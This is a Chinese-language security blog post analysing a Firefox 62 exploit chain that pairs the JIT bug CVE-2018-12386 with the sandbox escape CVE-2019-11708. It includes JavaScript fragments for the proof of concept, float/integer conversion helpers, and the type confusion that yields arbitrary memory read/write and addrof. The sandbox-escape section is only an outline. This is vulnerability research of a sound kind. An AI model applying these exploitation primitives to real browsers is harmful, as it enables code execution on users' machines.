<!DOCTYPE html>
<html lang="en-us">
  <head>
  <meta http-equiv="content-type" content="text/html;charset=utf-8">
  <meta http-equiv="X-UA-Compatible" content="chrome=1">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="robots" content="noodp"/>
  <meta name="author" content="Wo0dsHole">
  
  
  
  <link rel="prev" href="https://Wo0dsHole.github.io/1/ff72-build/" />
  <link rel="next" href="https://Wo0dsHole.github.io/1993/b0/" />
  <link rel="canonical" href="https://Wo0dsHole.github.io/1/62-full-exploit-chain/" />
  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
  <link rel="manifest" href="/site.webmanifest">
  <link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
  <meta name="msapplication-TileColor" content="#da532c">
  <meta name="theme-color" content="#ffffff">
  <title>
       
       
            | 树洞
       
  </title>
  <meta name="title" content=" | 树洞">
    
  
  <link rel="stylesheet" href="/font/iconfont.css">
  <link rel="stylesheet" href="/css/main.min.css">


  
  
 

<script type="application/ld+json">
 "@context" : "http://schema.org",
    "@type" : "BlogPosting",
    "mainEntityOfPage": {
         "@type": "WebPage",
         "@id": "https:\/\/Wo0dsHole.github.io\/"
    },
    "articleSection" : "posts",
    "name" : "",
    "headline" : "",
    "description" : "62-full-exploit-chain 0.基本信息   Firefox 62.0 win64 发行版\n  Windows 7 Sp1 x64 旗舰版\n  Windows 10 1909 x64 专业版\n  RCE：CVE-2018-12386\n Fixed in Firefox 62.0.3 \u0026amp; Firefox ESR 60.2.2    SBX：CVE-2019-11708\n Fixed in Firefox 67.0.4 \u0026amp; Firefox ESR 60.7.2    1.概述 RCE 常有，而 SBX 不常有。主要关注点在于 CVE-2019-11708 的机理，在此基础上选择了一个非常稳定的 RCE 漏洞（CVE-2018-12386），在发行版上完成一个 full exploit chain。\n同时小结一下浏览器 JS 漏洞利用中，Dangle Reference 到 任意地址读写 的通用过程。\n再者是整个过程中延展到的旁杂内容，作为对 Firefox 认识的积累。",
    "inLanguage" : "en-us",
    "author" : "Wo0dsHole",
    "creator" : "Wo0dsHole",
    "publisher": "Wo0dsHole",
    "accountablePerson" : "Wo0dsHole",
    "copyrightHolder" : "Wo0dsHole",
    "copyrightYear" : "0001",
    "datePublished": "0001-01-01 00:00:00 \u002b0000 UTC",
    "dateModified" : "0001-01-01 00:00:00 \u002b0000 UTC",
    "url" : "https:\/\/Wo0dsHole.github.io\/1\/62-full-exploit-chain\/",
    "wordCount" : "659",
    "keywords" : [  "树洞"]
}
</script>

</head>

  


  <body class="">
    <div class="wrapper">
        <nav class="navbar">
    <div class="container">
        <div class="navbar-header header-logo">
        	<a href="javascript:void(0);" class="theme-switch"><i class="iconfont icon-xihuan"></i></a>&nbsp;<a href="https://Wo0dsHole.github.io/">树洞</a>
        </div>
        <div class="menu navbar-right">
                
                
                <a class="menu-item" href="/posts/" title="">Blog</a>
                
                <a class="menu-item" href="/categories/" title="">Categories</a>
                
                <a class="menu-item" href="/tags/" title="">Tags</a>
                
                <a class="menu-item" href="/about/" title="">About</a>
                
        </div>
    </div>
</nav>
<nav class="navbar-mobile" id="nav-mobile" style="display: none">
     <div class="container">
        <div class="navbar-header">
            <div>  <a href="javascript:void(0);" class="theme-switch"><i class="iconfont icon-xihuan"></i></a>&nbsp;<a href="https://Wo0dsHole.github.io/">树洞</a></div>
            <div class="menu-toggle">
                <span></span><span></span><span></span>
            </div>
        </div>
     
          <div class="menu" id="mobile-menu">
                
                
                <a class="menu-item" href="/posts/" title="">Blog</a>
                
                <a class="menu-item" href="/categories/" title="">Categories</a>
                
                <a class="menu-item" href="/tags/" title="">Tags</a>
                
                <a class="menu-item" href="/about/" title="">About</a>
                
        </div>
    </div>
</nav>
    	 <main class="main">
          <div class="container">
      		
<article class="post-warp" itemscope itemtype="http://schema.org/Article">
    <header class="post-header">
        <h1 class="post-title" itemprop="name headline"></h1>
        <div class="post-meta">
                Written by <a itemprop="name" href="https://Wo0dsHole.github.io/" rel="author">Wo0dsHole</a> with ♥ 
                <span class="post-time">
                on <time datetime=0001-01-01 itemprop="datePublished">January 1, 0001</time>
                </span>
                in
                
        </div>
    </header>
    <div class="post-content">
        

        
            
        

        
        
     
          
          
          

          
          
          

          <h1 id="62-full-exploit-chain">62-full-exploit-chain</h1>
<h2 id="0基本信息">0.基本信息</h2>
<ul>
<li>
<p>Firefox 62.0 win64 发行版</p>
</li>
<li>
<p>Windows 7 Sp1 x64 旗舰版</p>
</li>
<li>
<p>Windows 10 1909 x64 专业版</p>
</li>
<li>
<p>RCE：CVE-2018-12386</p>
<ul>
<li>Fixed in Firefox 62.0.3 &amp; Firefox ESR 60.2.2</li>
</ul>
</li>
<li>
<p>SBX：CVE-2019-11708</p>
<ul>
<li>Fixed in Firefox 67.0.4 &amp; Firefox ESR 60.7.2</li>
</ul>
</li>
</ul>
<h2 id="1概述">1.概述</h2>
<p>RCE 常有，而 SBX 不常有。主要关注点在于 CVE-2019-11708 的机理，在此基础上选择了一个非常稳定的 RCE 漏洞（CVE-2018-12386），在发行版上完成一个 full exploit chain。</p>
<p>同时小结一下浏览器 JS 漏洞利用中，Dangle Reference 到 任意地址读写 的通用过程。</p>
<p>再者是整个过程中延展到的旁杂内容，作为对 Firefox 认识的积累。</p>
<h2 id="2rce">2.RCE</h2>
<h3 id="20概述">2.0概述</h3>
<p>CVE-2018-12386是一个寄存器分配的 Bug，非常直接的把返回值（eax） a.x 替换成了 b.y，造成一个 Dangle Reference。</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#75715e">// Generate objects with inline properties
</span><span style="color:#75715e"></span><span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">100</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>)
	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">o1</span> <span style="color:#f92672">=</span> {
		<span style="color:#a6e22e">s</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;asdf&#34;</span>,
		<span style="color:#a6e22e">x</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">13.37</span>
	};
<span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">100</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>)
	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">o2</span> <span style="color:#f92672">=</span> {
		<span style="color:#a6e22e">s</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;asdf&#34;</span>,
		<span style="color:#a6e22e">y</span><span style="color:#f92672">:</span> {}
	};
<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">f</span>(<span style="color:#a6e22e">a</span>, <span style="color:#a6e22e">b</span>) {
	<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">p</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">b</span>;
	<span style="color:#66d9ef">for</span> (; <span style="color:#a6e22e">p</span>.<span style="color:#a6e22e">s</span> <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">p</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">p</span>.<span style="color:#a6e22e">s</span>)
		<span style="color:#66d9ef">while</span> (<span style="color:#a6e22e">p</span> <span style="color:#f92672">===</span> <span style="color:#a6e22e">p</span>) {}
	<span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">10000000</span>; <span style="color:#f92672">++</span><span style="color:#a6e22e">i</span>) {}
	<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">a</span>.<span style="color:#a6e22e">x</span>;
}
<span style="color:#a6e22e">f</span>(<span style="color:#a6e22e">o1</span>, <span style="color:#a6e22e">o2</span>);
<span style="color:#a6e22e">f</span>(<span style="color:#a6e22e">o1</span>, <span style="color:#a6e22e">o2</span>);
<span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">f</span>(<span style="color:#a6e22e">o1</span>, <span style="color:#a6e22e">o2</span>));
<span style="color:#75715e">// Object @ 2.156713602e-314
</span></code></pre></div><p>对于 JS 而言，正常情况下用户是无法直接操作对象头（Object Head）的。Head 中的管理信息应是 JS 引擎所需的。</p>
<p>要达到任意地址读写，其本质就是利用 Dangle Reference 对一个具有 R/W 能力的对象的 Head 进行操作——修改其中的指向 Body 的指针。</p>
<p>明显的，这种具有 R/W 能力的对象第一时间会想到数组。但是由于 JS 是弱类型，一般的 Array对象 为了识别其中元素的类型，既会添加一些类型信息（Firefox 中 Array 元素紧跟一个类型的枚举值），在 R/W 时也会根据额外的类型信息对元素加以解释。</p>
<p>而在漏洞利用中，一般我们是着眼于 “内存” 一级关注 R/W 操作的，希望 R/W 时符合头脑中对一块内存直接操作的认知。</p>
<p>因此，最后完成任意 R/W 的载体，一般优先选择类型数组（TypedArray）。这也符合 JS 引入 TypedArray 的本意。</p>
<p>但 TypedArray 中，整型相关的数组对象只到 32 位，浮点型数组才有 64 位。这就涉及到一个浮点与整型的数据转化问题：数值输入-&gt;类型数组解析-&gt;内存存储。</p>
<p>但最近（Firefox 68）BigInt 特性的引入，上面的数据转化问题有了新的解法。事实上，网上公开的 CVE-2019-9810&amp;CVE-2019-11708 full exploit chain，作者的初衷就是学习 BigInt 并将其用于 exploit 中。</p>
<p>因此， “参考” 中 “CVE-2019-11708 Exp” 是针对 Firefox 测试版本 68.0a1，并不适用于 Firefox 的任何发行版。（Firefox 0a 后缀的是测试开发版，称为 Nightly。它对漏洞的修补滞后，功能特性的实现超前）</p>
<p>但他没用 TypedArray 中的 BigInt 部分，只是 BigInt 本身，这就使得在我看来和以前的数据转换没什么区别，甚至变得有些繁琐不清晰了。</p>
<h3 id="21数据转换">2.1数据转换</h3>
<h4 id="210问题本质">2.1.0问题本质</h4>
<p>只有浮点数组元素可以一次性容纳 64 bit，但直接的数值输入会被浮点数组解析一次，到内存时以另一种格式存储。</p>
<h4 id="211解决方法">2.1.1解决方法</h4>
<p>TypedArray 的使用本身存在一种 “分离”，先 ArrayBuffer 申请内存，再用 TypedArray 去统一解释这片内存的数据。</p>
<p>因此，可以先通过 32 位整型数组 “无解析” 的在内存上布置好数据，再通过 64 位浮点数组一次性的去操作同一块内存，而且将这些操作设置在两个 64 位浮点数组之间。它们就不存在转换问题了，而是直接作用于内存层面。</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">BASE</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x100000000</span>;
<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">u32</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Uint32Array</span>(<span style="color:#a6e22e">convert</span>);
<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">f64</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Float64Array</span>(<span style="color:#a6e22e">convert</span>);
<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">master</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Float64Array</span>(<span style="color:#ae81ff">0x100</span>); 
<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">i2f</span>(<span style="color:#a6e22e">x</span>) {
	<span style="color:#a6e22e">u32</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">x</span> <span style="color:#f92672">%</span> <span style="color:#a6e22e">BASE</span>;
	<span style="color:#a6e22e">u32</span>[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> (<span style="color:#a6e22e">x</span> <span style="color:#f92672">-</span> (<span style="color:#a6e22e">x</span> <span style="color:#f92672">%</span> <span style="color:#a6e22e">BASE</span>)) <span style="color:#f92672">/</span> <span style="color:#a6e22e">BASE</span>;
	<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">f64</span>[<span style="color:#ae81ff">0</span>];
}
<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">f2i</span>(<span style="color:#a6e22e">x</span>) {
	<span style="color:#a6e22e">f64</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">x</span>;
	<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">u32</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">+</span> <span style="color:#a6e22e">BASE</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">u32</span>[<span style="color:#ae81ff">1</span>];
}
<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">set_addr</span>(<span style="color:#a6e22e">where</span>) {
	<span style="color:#a6e22e">master</span>[<span style="color:#ae81ff">7</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">i2f</span>(<span style="color:#a6e22e">where</span>);
}
</code></pre></div><h3 id="22dangle-ref---arbitrary-rw">2.2Dangle Ref -&gt; Arbitrary R/W</h3>
<p>所谓漏洞的品相，其实是由 PoC 到达一个与 Dangle Ref 相关且有 R/W 能力的对象的难度来衡量的。此后漏洞利用的难易，则多和内存管理相关。</p>
<h4 id="220通用思路">2.2.0通用思路</h4>
<p><img src="D:%5CWo0dsHole%5Crw.png" alt="rw"></p>
<p>其实和 Windows 内核漏洞利用思路一样（两个 Bitmap），把漏洞本身有限的非常规 R/W 能力扩大，实现任意地址读写。</p>
<p>需要注意的是，这个环节并不一定是必须的。通常这样做是因为要对一些保护机制的绕过，但漏洞的利用本质是对 “控制上下文”、“数据上下文” 的操作能力，具体漏洞具体分析，不要被这个环节固化了思维。</p>
<h4 id="221cve-2018-12386">2.2.1CVE-2018-12386</h4>
<h5 id="2210bug-r">2.2.1.0Bug-R</h5>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">f</span>(<span style="color:#a6e22e">a</span>,<span style="color:#a6e22e">b</span>)
{
......
	<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">action</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>)
	{
		<span style="color:#a6e22e">victim_addr_f</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">a</span>[<span style="color:#ae81ff">3</span>]
		<span style="color:#a6e22e">container_addr_f</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">a</span>[<span style="color:#ae81ff">4</span>]
	}<span style="color:#66d9ef">else</span>
......
}

<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">victim</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Uint8Array</span>(<span style="color:#ae81ff">0x100</span>); 
<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">container</span> <span style="color:#f92672">=</span> {<span style="color:#a6e22e">a</span><span style="color:#f92672">:</span>{}}; 
<span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;<span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">100</span>;<span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>)
{
    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">x</span> <span style="color:#f92672">=</span> {<span style="color:#a6e22e">x</span><span style="color:#f92672">:</span><span style="color:#ae81ff">13.37</span>,<span style="color:#a6e22e">y</span><span style="color:#f92672">:</span><span style="color:#a6e22e">victim</span>,<span style="color:#a6e22e">z</span><span style="color:#f92672">:</span><span style="color:#a6e22e">container</span>}
    <span style="color:#a6e22e">objs</span>[<span style="color:#a6e22e">i</span>] <span style="color:#f92672">=</span> {<span style="color:#a6e22e">x</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#39;asd&#39;</span>, <span style="color:#a6e22e">p1</span><span style="color:#f92672">:</span>{}, <span style="color:#a6e22e">p2</span><span style="color:#f92672">:</span>{}, <span style="color:#a6e22e">p3</span><span style="color:#f92672">:</span>{}, <span style="color:#a6e22e">p4</span><span style="color:#f92672">:</span>{}, <span style="color:#a6e22e">p5</span><span style="color:#f92672">:</span><span style="color:#a6e22e">x</span>}
}
<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">a</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Float64Array</span>(<span style="color:#ae81ff">1024</span>)
<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">b</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">objs</span>[<span style="color:#ae81ff">0</span>]
<span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">j</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;<span style="color:#a6e22e">j</span> <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">5</span>; <span style="color:#f92672">++</span><span style="color:#a6e22e">j</span>)
    <span style="color:#a6e22e">f</span>(<span style="color:#a6e22e">a</span>,<span style="color:#a6e22e">b</span>)
<span style="color:#a6e22e">victim_addr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">f2i</span>(<span style="color:#a6e22e">victim_addr_f</span>)
<span style="color:#a6e22e">container_addr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">f2i</span>(<span style="color:#a6e22e">container_addr_f</span>) 
</code></pre></div><p>第一次，将 Float64Array 与自定义对象混淆，从而用 Float64Array 的 R 能力，泄露出自定义对象中：Uint8Array对象 victim、自定义对象 container 的引用（reference）。</p>
<h5 id="2211bug-w">2.2.1.1Bug-W</h5>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">f</span>(<span style="color:#a6e22e">a</span>,<span style="color:#a6e22e">b</span>)
{
......
	}<span style="color:#66d9ef">else</span>
	{
		<span style="color:#a6e22e">a</span>[<span style="color:#ae81ff">7</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">victim_addr_f</span>
	}
}
<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">set_addr</span>(<span style="color:#a6e22e">where</span>) {
	<span style="color:#a6e22e">master</span>[<span style="color:#ae81ff">7</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">i2f</span>(<span style="color:#a6e22e">where</span>);
}
<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">master</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Float64Array</span>(<span style="color:#ae81ff">0x100</span>); 
<span style="color:#a6e22e">objs</span> <span style="color:#f92672">=</span> []
<span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;<span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">100</span>;<span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>)
{
	<span style="color:#a6e22e">objs</span>[<span style="color:#a6e22e">i</span>] <span style="color:#f92672">=</span> {<span style="color:#a6e22e">x</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#39;asd&#39;</span>,<span style="color:#a6e22e">p1</span><span style="color:#f92672">:</span>{},<span style="color:#a6e22e">p2</span><span style="color:#f92672">:</span>{},<span style="color:#a6e22e">p3</span><span style="color:#f92672">:</span>{},<span style="color:#a6e22e">p4</span><span style="color:#f92672">:</span>{},<span style="color:#a6e22e">p5</span><span style="color:#f92672">:</span><span style="color:#a6e22e">master</span>}
}
<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">b</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">objs</span>[<span style="color:#ae81ff">0</span>]
<span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">j</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">j</span> <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">5</span>; <span style="color:#f92672">++</span><span style="color:#a6e22e">j</span>)
	<span style="color:#a6e22e">f</span>(<span style="color:#a6e22e">a</span>, <span style="color:#a6e22e">b</span>);
</code></pre></div><p>第二次，将 Float64Array 与新自定义对象混淆，从而用 Float64Array 的 W 能力，将 victim ref 写入 master 对象头的 <code>[*pdata]</code> 字段，使得 master[7] 对应 victim 对象头的 <code>[*pdata]</code>字段。</p>
<p>到达上图结构，实现任意地址读写。</p>
<h5 id="2212粒度思考">2.2.1.2粒度思考</h5>
<p>Dangle Ref -&gt; Arbitrary R/W 过程中，关键在于对 Object Head 的操作。而前面的数据转换问题也是由 64位 环境而决定的，因为 Head 中必然存在的 <code>*pdata</code> 是 64 位，所以需要寻找一个匹配的粒度——Float64Array。</p>
<p>但从数据转化的本质可知，这样的 “大粒度” 并不是必须的。相反，小粒度能到什么程度，可能更加重要。</p>
<p>曾遇到过操作粒度不够小，导致 Head 中 64位字段无法完全控制的情况。但对于上述模型而言，应该注意到——对 Head 的操作粒度是可调整的（不同类型的 master），最小到字节粒度。</p>
<h4 id="222firefox相关细节">2.2.2Firefox相关细节</h4>
<p>不同数组对象中 <code>*pdata</code> 偏移、对象嵌套时的内存安排、数组元素的不同类型标签、数组嵌套时的内存安排、DOM对象中与 xul 偏移固定的字段&hellip;&hellip;</p>
<p>这些都是小道，可以临时一探索就知道了，没必要总结成经验。完全可以先直接用，遇到错误再探索调整。因为它们都是符合正常逻辑，易得。</p>
<h5 id="2220对象地址">2.2.2.0对象地址</h5>
<p>此漏洞 exp 中唯一不符合逻辑直觉的地方，是通过 container 对一个对象的地址泄露上，为何是取 48 位？</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">container</span> <span style="color:#f92672">=</span> {<span style="color:#a6e22e">a</span><span style="color:#f92672">:</span>{}};
<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">addrof</span>(<span style="color:#a6e22e">x</span>) {
	<span style="color:#a6e22e">container</span>.<span style="color:#a6e22e">a</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">x</span>;
	<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">read48</span>(<span style="color:#a6e22e">container_addr</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x20</span>);
}
</code></pre></div><pre><code>
</code></pre><p>需要注意 64 位环境中指针也是 64 位，<code>Long Hex</code>是我 Windbg 中常用显示方式，这里存的是小端序。</p>
<p>故<code>fffe01720b78e130</code>是对象引用，但以前 “内存搜索” 文章小结也提到，64 位进程实际使用的空间常常只是多了一些而已，明显高 16 位有问题。实际中，对象的 ref 高 16 位置 0 ，就把这当作 Firefox 的一个特性吧，知道即可。</p>
<h2 id="3sbx">3.SBX</h2>
<h3 id="30概述">3.0概述</h3>
<p>此沙盒逃逸漏洞的使用有前置条件，即先要达到一定 “特权等级”，这是通过 RCE 漏洞对 xul 的 Patch，关闭一些安全检查而实现的。</p>
<p>它的思想源于 Pwn2Own 2014，再结合最近 ZDI Blog 提到 Pwn2Own 2019 的 SBX，可知这种思路普遍应用在利用浏览器自身的 Web 扩展进行沙盒逃逸的攻击面上。</p>
<p>自然地，这样绕过沙盒达到的权限和后续的不同手法相关，但最高是 chrome process 级别的。不过已经可以访问文件系统、调用系统 API（如 CreateProcessA）了。</p>
<p>而这些 “后续手法” 中，与 chome process 建立联系是最主要的思路。</p>
<p>比如此漏洞中，RCE 提升到一定 “特权等级” 后，结合 SBX 漏洞达到使得 chrome process 执行 content process 内容的效果，即将 RCE 再次应用到 chrome process 中，摆脱沙盒限制。</p>
<p>这个过程中，主要涉及到了 Firefox 的 PrivilegeManager、Components object、Message manager、Security checks。</p>
<p>但遗憾的是，这其中的很多特性都濒临废弃，所以需要深入了解以明白其中的思想，用于以后新的沙盒绕过探索中。</p>
<h3 id="31rce-特权等级">3.1RCE-&gt;特权等级</h3>
<h4 id="310privilegemanager">3.1.0PrivilegeManager</h4>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">RunningFromPrivilegedJS</span> <span style="color:#f92672">=</span> window.netscape.<span style="color:#a6e22e">security</span>.<span style="color:#a6e22e">PrivilegeManager</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">undefined</span>;
</code></pre></div><h2 id="-1参考">-1.参考</h2>
<ul>
<li>
<p>CVE-2018-12386 Writeup：https://ssd-disclosure.com/archives/3765</p>
</li>
<li>
<p>CVE-2019-11708 Exp：https://github.com/0vercl0k/CVE-2019-11708/</p>
</li>
<li>
<p>Message manager：https://developer.mozilla.org/en-US/docs/Mozilla/Firefox/Multiprocess_Firefox/Message_Manager/Message_manager_overview</p>
</li>
<li>
<p>nsIScriptSecurityManager 接口信息：http://doxygen.db48x.net/mozilla/html/interfacensIScriptSecurityManager.html</p>
</li>
<li>
<p>Firefox源码：http://ftp.mozilla.org/pub/firefox/releases/</p>
</li>
<li>
<p>Pwn2Own 2014：https://bugzilla.mozilla.org/show_bug.cgi?id=982974</p>
</li>
<li>
<p>Pwn2Own 2019 SBX：https://www.thezdi.com/blog/2019/12/15/syncing-out-of-the-firefox-sandbox</p>
</li>
<li>
<p>Components object：https://developer.mozilla.org/en-US/docs/Mozilla/Tech/XPCOM/Language_Bindings/Components_object</p>
</li>
<li>
<p>Security checks：https://developer.mozilla.org/en-US/docs/Mozilla/Gecko/Script_security#Security_checks</p>
</li>
<li>
<p>PrivilegeManager：https://developer.mozilla.org/en-US/docs/Archive/Misc_top_level/Bypassing_Security_Restrictions_and_Signing_Code</p>
</li>
</ul>

    </div>

    <div class="post-copyright">
             
            <p class="copyright-item">
                <span>Author:</span>
                <span>Wo0dsHole </span>
                </p>
            
           
             
            <p class="copyright-item">
                    <span>Link:</span>
                    <a href=https://Wo0dsHole.github.io/1/62-full-exploit-chain/>https://Wo0dsHole.github.io/1/62-full-exploit-chain/</span>
            </p>
            
             
            <p class="copyright-item lincese">
                本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可
            </p>
            
    </div>

  
    <div class="post-tags">
        
        <section>
                <a href="javascript:window.history.back();">back</a></span> · 
                <span><a href="https://Wo0dsHole.github.io/">home</a></span>
        </section>
    </div>

    <div class="post-nav">
        
        <a href="https://Wo0dsHole.github.io/1/ff72-build/" class="prev" rel="prev" title=""><i class="iconfont icon-left"></i>&nbsp;</a>
         
        
        <a href="https://Wo0dsHole.github.io/1993/b0/" class="next" rel="next" title="CVE-2019-5786笔记">CVE-2019-5786笔记&nbsp;<i class="iconfont icon-right"></i></a>
        
    </div>

    <div class="post-comment">
          
                 
          
    </div>
</article>
          </div>
		   </main>
      <footer class="footer">
    <div class="copyright">
        &copy;
        
        <span itemprop="copyrightYear">1993 - 2020</span>
        
        <span class="with-love">
    	 <i class="iconfont icon-love"></i> 
         </span>
         
            <span class="author" itemprop="copyrightHolder"><a href="https://Wo0dsHole.github.io/">Wo0dsHole</a> | </span> 
         

         
		  <span>Powered by <a href="https://gohugo.io/" target="_blank" rel="external nofollow">Hugo</a> & <a href="https://github.com/liuzc/leaveit" target="_blank" rel="external nofollow">LeaveIt</a></span> 
    </div>
</footer>












    
     <link href="//lib.baomitu.com/lightgallery/1.6.11/css/lightgallery.min.css" rel="stylesheet">  
      
     <script src="/js/vendor_gallery.min.js" async="" ></script>
    
  



     </div>
  </body>
</html>
